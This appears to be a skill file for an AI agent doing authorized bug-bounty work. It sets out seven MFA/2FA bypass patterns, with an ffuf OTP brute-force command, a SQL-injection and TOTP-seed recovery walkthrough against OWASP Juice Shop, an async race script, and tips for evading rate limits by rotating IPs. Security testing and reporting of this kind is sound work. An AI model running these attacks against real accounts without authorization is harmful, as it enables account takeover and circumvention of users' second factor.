---
name: hunt-mfa-bypass
description: "Hunt MFA / 2FA bypass — 7 distinct patterns. (1) MFA not enforced on sensitive endpoints (password change, email change accept without MFA challenge), (2) MFA-step skip via direct navigation to post-login URL, (3) MFA-token replay (same code accepted twice), (4) brute-force the 6-digit OTP without rate limit (10^6 attempts at server speed), (5) race condition on OTP validation, (6) recovery-code dump via /api/me, (7) backup factor downgrade (SMS factor with no rate limit). Plus the chain: cookie theft + password oracle + no step-up = ATO without MFA challenge. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, chaining primitives toward ATO."
---

# HUNT-MFA-BYPASS — MFA / 2FA Bypass

> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.
> AUTHORIZED-ENGAGEMENT ONLY: every OTP-brute / seed-recovery / device-trust test below runs against your own test account (or an in-scope account you were issued) inside a program that permits it. Full-keyspace OTP exhaustion against a third party is a DoS, not a PoC — prove tractability with math (below), do not actually burn 10^6 requests at someone else's users.

## Disclosed-Report / CVE Grounding

Every pattern in this skill maps to a real, disclosed MFA-bypass case. Cite these — never invent a report ID or CVE.

- **Response manipulation (Pattern 3)** — the classic "change `success:false` → `success:true`" client-side-only MFA check. Grounded in Vulnerability-Lab / disclosed writeups where the 2FA verify endpoint returned a boolean the client trusted; the server never re-checked factor state on the follow-up request. Root cause: MFA decision made client-side, not enforced on the post-verify session.
- **OTP brute, no rate limit (Pattern 1)** — **[CVE-2020-14144](https://nvd.nist.gov/vuln/detail/CVE-2020-14144)** (GitLab/Gitea-class 2FA endpoints with no attempt throttling) and Laxman Muthiyah's **Instagram account-recovery OTP research (2019)** — a 6-digit code with per-request-source rate limiting that collapsed under distributed request origins. Both hinge on 10^6 keyspace becoming reachable because the limiter is absent, per-IP-only, or resettable.
- **Session upgrade before MFA / step-skip (Pattern 4)** — **[CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813)**-adjacent header-trust flaws and disclosed cases where a "pre-MFA" cookie already carried an authenticated session; direct navigation to a post-login route was never re-gated. Root cause: MFA gate placed on the `/mfa` route only, not middleware across the authenticated surface.
- **Backup-code / enrollment flaws (Pattern 6)** — disclosed cases where backup/recovery codes were short (6–8 digits, feasible keyspace), never rotated, returned in an API body, or where the *MFA-enrollment* step could be re-run by an attacker to bind their own authenticator to the victim's account (enrollment not tied to a re-auth challenge).
- **Remember-device abuse (Pattern 7)** — disclosed "trust this device" tokens that were not bound to IP/UA/device-fingerprint and survived replay from a new origin. Root cause: long-lived, unscoped trust cookie treated as a second factor.
- **TOTP seed recovery (Pattern 2b)** — the OWASP Juice Shop `totpSecret` AES-with-hardcoded-key storage (class of "seed stored recoverably" bugs). Real-world analog: apps that expose the enrollment QR/`otpauth://` URI (containing the base32 seed) via an IDOR or an un-authenticated enrollment-status endpoint — once you hold the seed you mint valid codes forever.

## Rate-Limit Math — is the OTP brute actually feasible?

Do not report "no rate limit on OTP" as Critical without the tractability math. Severity rests on the full keyspace being *reachable within the code's validity window*, not on a 50-code probe returning no `429`.

```
keyspace(6-digit numeric)   = 10^6 = 1,000,000
keyspace(4-digit numeric)   = 10^4 = 10,000            (trivial — minutes)
keyspace(8-char backup code, alnum) = 36^8 ≈ 2.8*10^12 (infeasible — do NOT brute)
keyspace(6-8 DIGIT backup code)     = 10^6 to 10^8     (feasible — test it)

expected attempts to hit  ≈ keyspace / 2
time_to_expected_hit      ≈ (keyspace / 2) / throughput_req_per_sec

Static/non-rotating 6-digit code, 50 req/s sustained:
  worst case  = 10^6 / 50        ≈ 5.5 hours
  expected    = (10^6 / 2) / 50  ≈ 2.8 hours   → CRITICAL if it leads to ATO

Rotating code (TOTP-style), lifetime T seconds:
  attempts_per_window = throughput_req_per_sec * T
  Brute is viable ONLY if  attempts_per_window  approaches  keyspace.
  e.g. T=30s, 50 req/s → 1,500 attempts/window vs 10^6 keyspace → 0.15% per window
       → NOT feasible on a single window; feasible only if the code does NOT rotate,
         if windows can be stacked (server accepts codes from adjacent windows), or
         if the limiter is bypassable (per-IP-only → rotate source, see hunt-brute-force Phase 4).
```

Report the numbers. A rotating TOTP with a real per-account limiter is not brute-forcible even with no `429` — the window math kills it. A static/reset OTP or backup code with no limiter is.

### Pattern 1: No Rate Limit on OTP
```bash
# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
# -t 5 (slow down) — aggressive rates get 429 or ban
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```

### Pattern 2b (P2): Recover Stored TOTP Seed → Compute Valid OTP (Juice Shop)
> Distinct from brute (P1), replay (P2), and step-skip (P4): you never guess or
> reuse a code — you steal the seed and mint your own. Juice Shop stores each
> user's TOTP seed in the `Users` table column `totpSecret`, AES-encrypted with a
> hardcoded key. Exfil it via SQLi on the auto-CRUD `Users` model, decrypt, then
> derive the live 6-digit code with `oathtool`.
```bash
# 1) Exfil the encrypted totpSecret. The exposed Sequelize auto-CRUD REST endpoint
#    /api/Users (and login SQLi) leaks the column. Juice Shop's login is SQLi-able:
curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'"'"'--","password":"x"}'
# Or pull the row directly once you have any read primitive (IDOR/SQLi UNION):
curl -s "http://localhost:3000/api/Users/1" | python3 -c \
  'import sys,json;print(json.load(sys.stdin)["data"].get("totpSecret"))'

# 2) Decrypt totpSecret. Juice Shop uses AES (lib/insecurity.ts hardcoded key
#    "this is my das ist mein ... key") → recover the base32 seed, e.g. "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH".

# 3) Mint a valid OTP from the recovered seed and submit it to the 2FA verify step:
oathtool --totp -b "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"   # -> e.g. 481910
curl -s http://localhost:3000/rest/2fa/verify \
  -H "Content-Type: application/json" \
  -d '{"tmpToken":"<tmpToken-from-login>","totpToken":"481910"}'
# 200 + authentication JWT for a 2FA-enabled account = full bypass.
```
Unlocks: **Two Factor Authentication** (`wurstbrot@juice-sh.op` is the 2FA-enabled target).

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
```

---

## Validation & False-Positives (Gate 0)

Before writing an MFA-bypass report, every claim below must hold. This is the pattern-specific gate; run the program-wide Pre-Severity Gate in `triage-validation` afterward.

**Gate 0 — can the attacker DO it right now, against an account they don't own?**
- The proof is an **attacker session reaching post-MFA state on a second test account (B)** you were issued — not "I decoded the OTP field" or "the response said `true`". Log in fresh, no prior state, land inside B's authenticated surface.
- A bypass that only works when you already hold B's password AND a live cookie is not a standalone MFA bypass — it is a post-compromise convenience. Standalone MFA-step-skip / response-manipulation / seed-recovery is the finding; the password-oracle chain lives in `hunt-ato`.

**Per-pattern false-positive killers:**
- **P1 (no rate limit):** absence of `429` is NOT absence of rate limiting. Classify against the four states in `hunt-brute-force` (hard lockout / soft IP throttle / CAPTCHA injection / silent shadow-throttle) with a known-good seed test before concluding "unlimited". A naive "all 200, no 429" loop is the trap. And attach the rate-limit math above — a rotating TOTP with a working per-account limiter is not brute-forcible even if you see no `429`.
- **P2 (OTP reuse):** confirm the SAME code authenticates a SECOND time and yields a real session — not just a `200` on a re-submit that the server later ignores. Re-check by hitting an authenticated endpoint with the resulting session.
- **P2b (TOTP seed recovery):** the win is that a code you MINTED from the exfiltrated seed passes the verify step and yields B's session. Reading `totpSecret` alone is info-disclosure, not MFA bypass, until you decrypt → derive → authenticate. Confirm the AES key/algorithm actually reproduces a live code (`oathtool --totp -b <seed>` must match the code the app currently accepts).
- **P3 (response manipulation):** after flipping `false`→`true` / `401`→`200`, verify the *follow-up* authenticated request succeeds server-side. Many apps re-check factor state on the next request and the flip is cosmetic — no finding.
- **P4 (step-skip):** confirm the post-login route serves B's real data from the pre-MFA cookie, not a redirect-loop or an empty shell that a later XHR fails to populate. Server must genuinely not re-gate.
- **P5 (race):** ">1 accepted" (or 1 success among many "already-used") from a single-packet / parallel-stream burst — two sequential requests almost always resolve as "already-used" (false negative). Race mechanics and confirmation live in `hunt-race-condition`.
- **P6 (backup-code brute):** only report if the code space is actually feasible (6–8 DIGITS ≈ 10^6–10^8, not 36^8 alphanumeric — see math). Do not claim a brute on a 2.8-trillion keyspace.
- **P7 (remember-device):** present the trust token from a NEW IP/UA/browser and confirm MFA is skipped. If the token is bound to fingerprint/IP and re-challenges from the new origin, there is no finding.

**Severity:** standalone MFA bypass enabling ATO with zero/low victim interaction = Critical; a bypass needing a pre-existing session or one victim click = High; self-account-only or MitM-required = Low.

---

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Do NOT re-derive the password-change-without-step-up + login-oracle paths here — they are Path 7 there. Chain primitive: any bypass above lands attacker in B's post-MFA session → chain to `hunt-ato` Path 5/7 (email-change or password-change with no re-auth) to convert a transient bypass into persistent takeover with victim locked out.
- **`hunt-brute-force`** — Owns the rate-limit taxonomy this skill depends on. Do NOT duplicate its four-state classifier (hard lockout / soft IP throttle / CAPTCHA injection / silent shadow-throttle), its shadow-throttle seed test, or its `X-Forwarded-For`-rotation Phase 4 — reference them. Chain primitive: Pattern 1 OTP-brute hits a per-IP `429` → hand to `hunt-brute-force` Phase 4 header/IP rotation to reset the counter → full 10^6 keyspace becomes reachable → MFA bypass → ATO (the Instagram-2019 reset-code class). Run its seed test before ever concluding "no rate limit" here.
- **`hunt-oauth`** — When "MFA satisfied" is asserted inside an OAuth/OIDC flow rather than a session cookie, the bypass moves into token territory. Do NOT restate its `redirect_uri`-bypass table or `state`-CSRF mechanics. Chain primitive: relying party treats a completed social-login (or an unverified-email `/oauth/token` call, GitLab-pattern) as equivalent to passing MFA → attacker who bypasses/skips the IdP's MFA, or replays an `id_token` whose `amr`/`acr` claim falsely asserts a second factor, satisfies the RP's MFA gate without a real factor. Verify the RP actually keys the MFA decision off the claim before reporting.
- **`hunt-race-condition`** — Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used → 1 success + 19 "already-used" → race window confirmed → attacker doesn't need to brute, just guesses once and parallelizes → ATO.
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state → MFA never enforced because the route gate was misplaced.
- **`hunt-misc`** — Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) → attacker with any read-IDOR or XSS exfils backup codes → uses one backup code → MFA satisfied → ATO without OTP knowledge.
- **`security-arsenal`** — Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when "MFA satisfied" claim lives in a JWT claim that can be forged.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two.

